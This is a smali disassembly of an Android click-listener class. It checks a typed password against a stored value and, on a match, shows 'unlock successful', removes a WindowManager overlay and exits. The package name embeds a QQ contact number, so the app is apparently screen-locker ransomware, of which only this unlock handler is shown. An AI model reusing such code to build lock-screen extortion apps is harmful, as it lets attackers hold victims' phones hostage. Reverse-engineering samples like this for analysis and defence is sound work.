.class Lzihao/QQ1365036395/a$100000001;
.super Ljava/lang/Object;
.source "a.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lzihao/QQ1365036395/a;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final this$0:Lzihao/QQ1365036395/a;


# direct methods
.method constructor <init>(Lzihao/QQ1365036395/a;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    return-void
.end method

.method static access$0(Lzihao/QQ1365036395/a$100000001;)Lzihao/QQ1365036395/a;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 160
    move-object v0, p0

    move-object v1, p1

    move-object v5, v0

    :try_start_0
    iget-object v5, v5, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    invoke-static {v5}, Lzihao/QQ1365036395/a;->access$L1000013(Lzihao/QQ1365036395/a;)Landroid/widget/EditText;

    move-result-object v5

    invoke-virtual {v5}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v5

    invoke-interface {v5}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v5

    move-object v2, v5

    .line 161
    move-object v5, v0

    iget-object v5, v5, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    iget v5, v5, Lzihao/QQ1365036395/a;->pasM:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    move-object v3, v5

    .line 162
    move-object v5, v2

    move-object v6, v3

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    .line 163
    move-object v5, v0

    iget-object v5, v5, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    const-string v6, "\u89e3\u9501\u6210\u529f\uff01"

    const/4 v7, 0x0

    invoke-static {v5, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v5

    invoke-virtual {v5}, Landroid/widget/Toast;->show()V

    .line 164
    move-object v5, v0

    iget-object v5, v5, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    invoke-static {v5}, Lzihao/QQ1365036395/a;->access$L1000002(Lzihao/QQ1365036395/a;)Landroid/view/WindowManager;

    move-result-object v5

    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    invoke-static {v6}, Lzihao/QQ1365036395/a;->access$L1000003(Lzihao/QQ1365036395/a;)Landroid/view/View;

    move-result-object v6

    invoke-interface {v5, v6}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 165
    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/System;->exit(I)V

    .line 167
    :goto_0
    return-void

    :cond_0
    move-object v5, v0

    iget-object v5, v5, Lzihao/QQ1365036395/a$100000001;->this$0:Lzihao/QQ1365036395/a;

    const-string v6, "\u5bc6\u7801\u9519\u8bef\uff01"

    const/4 v7, 0x0

    invoke-static {v5, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v5

    invoke-virtual {v5}, Landroid/widget/Toast;->show()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v5

    move-object v2, v5

    goto :goto_0
.end method
